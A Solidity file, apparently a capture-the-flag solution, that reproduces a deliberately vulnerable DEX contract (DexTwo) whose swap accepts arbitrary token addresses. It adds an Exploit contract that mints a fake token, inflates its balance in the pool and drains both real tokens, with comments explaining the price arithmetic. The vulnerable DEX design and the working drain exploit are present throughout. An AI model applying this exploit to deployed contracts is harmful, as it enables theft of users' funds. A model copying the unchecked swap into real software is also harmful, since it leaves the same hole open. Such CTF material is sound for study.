// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() Ownable(msg.sender) {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(
        address dexInstance,
        string memory name,
        string memory symbol,
        uint256 initialSupply
    )
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

contract Exploit {
    function exploit(DexTwo dexTwo, SwappableTokenTwo token1, SwappableTokenTwo token2) public {
        //create our own token with unlimited supply and approve DexTwo to spend
        SwappableTokenTwo exploitToken = new SwappableTokenTwo(address(dexTwo), "Exploit", "E", type(uint256).max);
        exploitToken.approve(address(this), address(dexTwo), type(uint256).max);

        //Send 100 Exploit tokens to DexTwo to manipulate balance of `from` token in `getSwapAmount`
        //When we swap 100 Exploit tokens for token1, we will get 100 * token1.balance / exploitToken.balance
        //which is 100 * 100 / 100 = 100 of token1 swapped out to Exploit
        exploitToken.transfer(address(dexTwo), 100);
        dexTwo.swap(address(exploitToken), address(token1), 100);

        //At this point, DexTwo has 200 Exploit tokens and 100 token2.
        //We can swap 200 Exploit tokens for token2, we will get 200 * token2.balance / exploitToken.balance
        //which is 200 * 100 / 200 = 100 of token2 swapped out to Exploit
        dexTwo.swap(address(exploitToken), address(token2), 200);
    }
}
